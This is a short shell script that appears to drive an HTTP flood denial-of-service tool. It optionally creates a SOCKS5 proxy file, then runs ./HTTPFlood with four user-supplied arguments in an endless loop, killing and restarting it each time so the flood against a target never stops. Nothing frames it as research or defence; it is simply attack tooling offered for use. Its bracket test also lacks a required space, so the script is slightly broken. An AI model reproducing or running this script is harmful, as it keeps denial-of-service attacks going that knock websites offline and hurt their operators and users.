if [$5 == "socksCrawler"]
then
touch socks5.txt
fi
while true; do
./HTTPFlood $1 $2 $3 $4
sudo pkill HTTPFlood
done
